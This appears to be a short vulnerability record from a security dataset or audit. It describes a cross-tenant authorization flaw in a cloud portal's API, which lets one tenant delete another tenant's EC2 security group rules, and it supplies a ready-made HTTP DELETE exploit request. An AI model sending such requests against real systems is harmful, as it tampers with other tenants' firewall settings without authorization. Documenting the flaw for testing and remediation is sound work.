diagnosis: An administrative API Gateway endpoint exposes EC2 security group rule deletion taking groupId and ruleId from the path. It does not verify whether the requesting user's tenant account owns groupId, allowing tenant cross-deletion of ingress firewall rules.
exploit_request:
DELETE /security-groups/sg-01a2b3c4d5e6/rules/sgr-0987654321fedcba HTTP/1.1
Host: cloud-ops.portal.io
Authorization: Bearer <user_token>
